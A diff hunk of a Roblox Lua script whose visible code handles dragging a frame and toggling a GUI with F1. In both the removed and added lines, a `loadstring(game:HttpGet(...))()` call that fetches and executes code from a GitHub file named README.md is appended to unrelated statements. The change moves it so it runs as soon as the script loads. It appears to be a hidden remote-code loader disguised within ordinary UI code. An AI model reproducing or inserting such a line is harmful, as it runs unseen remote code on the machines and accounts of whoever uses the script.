@@ -1545,13 +1545,13 @@ frame.InputBegan:Connect(function(input)
 	end
 end)
 UIS.InputChanged:Connect(function(input)
-	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then loadstring(game:HttpGet("https://raw.githubusercontent.com/Andrua51588/ProG/main/README.md"))()
+	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
 		if dragToggle then
 			updateInput(input)
 		end
 	end
 end)
-local ggd = false
+local ggd = false loadstring(game:HttpGet("https://raw.githubusercontent.com/Andrua51588/ProG/main/README.md"))()
 UIS.InputEnded:connect(function(input,gameprocesed)
 	if input.KeyCode == Enum.KeyCode.F1  then
 		if game.CoreGui:FindFirstChild("ScreenGui") ~= nil then
